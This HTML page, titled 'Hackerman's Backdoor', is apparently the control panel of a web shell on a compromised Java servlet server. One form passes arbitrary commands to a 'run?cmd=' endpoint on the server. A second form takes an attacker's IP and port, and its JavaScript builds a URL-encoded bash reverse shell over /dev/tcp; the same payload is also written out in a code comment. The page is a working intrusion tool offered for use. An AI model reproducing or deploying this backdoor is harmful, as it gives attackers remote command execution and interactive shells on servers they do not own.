<!DOCTYPE html>
<html>

<head>
    <title>Hackerman's Backdoor</title>

    <style>
        /* #d8dbe2, #a9bcd0, #58a4b0, #373f51, #1b1b1e */
        html {
            width: 100%;
            height: 100%;
        }
        body {
            background-color: #8e44ad;
            background: linear-gradient(150deg,#1b1b1e, #8e44ad);
            margin: 0;
            padding: 0;

            font-size: 16pt;
            color: #d8dbe2;
            text-shadow: 2px 1px 2px #373f51;
            font-family: monospace;
            text-align: center;
        }

        button,
        input[type=submit] {
            background-color: #373f51;
            border: none;
            border-radius: 10px;
            color: #d8dbe2;
            cursor: pointer;
            font-family: monospace;
            font-size: 1em;
            margin: 5px;
            padding: 8px 15px;
            box-shadow: inset 0 0 2px #58a4b0;
        }

        button:hover,
        input[type=submit]:hover {
            background-color: #58a4b0;
            color: #1b1b1e;
        }

        button:active,
        input[type=submit]:active {
            background-color: #a9bcd0;
            color: #1b1b1e;
        }

        input[type=text] {
            background-color: #d8dbe2;
            border: none;
            border-radius: 10px;
            color: #1b1b1e;
            font-family: monospace;
            font-size: 1em;
            margin: 5px;
            padding: 8px 15px;
            width: 266px;
            box-shadow: inset 0 0 2px #a9bcd0;
        }
        input[type=text]::placeholder {
            color: #596781;
        }
        input[type=text]:focus {
            outline: 2px solid #58a4b0;
        }

        #cmd-input {
            margin-right: 0;
            border-right: 1px solid #373f51;
            border-radius: 10px 0 0 10px;
            width: 350px;
            z-index: 100;
        }
        #run-cmd {
            margin-left: 0;
            border-radius: 0 10px 10px 0;
        }

        form {
            display: inline-block;
            font-family: sans-serif;

            padding: 20px;
            border-radius: 20px;
            border: 3px solid #282c36;
            box-shadow: 6px 6px 0 #282c36;
            background: linear-gradient(#596781, #4b5568);
        }
        #bd-form {
            text-align: left;
            width: 300px;
        }
        #run-form {
            width: 500px;
        }

        label {
            font-size: 0.8em;
        }
        #bd-connect {
            width: 100%;
            padding: 12px 15px;
        }
        
        hr {
            border-color: #727e94;
        }
    </style>
</head>

<body>
    <script>
        // myservlet?cmd=bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F{IP}%2F{PORT}+0%3E%261%22
        function submitForm(event) {
            event.preventDefault();
            var ip = document.getElementById("bd-form").elements.namedItem("ip").value;
            var port = document.getElementById("bd-form").elements.namedItem("port").value;
            window.location.href += "run?cmd=bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F" + ip + "%2F" + port + "+0%3E%261%22";
        }

        window.onload = function () {
            document.getElementById("bd-form").addEventListener("submit", submitForm);
        }
    </script>

    <h1>Hackerman's Backdoor</h1>

    <div>
        <form id="run-form" action="run" method="get">
            Run your command on the server <hr>
            <input id="cmd-input" spellcheck="false" type="text" name="cmd" placeholder="echo Hello World"><input id="run-cmd" type="submit" value="Run">
        </form>

        <br>
        <br>
        <br>

        <form id="bd-form">
            Fill the form to get a backdoor<hr>

            <label spellcheck="false" for="ip">IP Address:</label><br>
            <input type="text" name="ip" placeholder="192.168.1.100"><br>
            <label spellcheck="false" for="port">Port:</label><br>
            <input type="text" name="port" placeholder="4321"><br>

            <div style="text-align: center;">
                <br>
                <input id="bd-connect" type="submit" value="Connect">
            </div>
        </form>
    </div>
</body>

</html>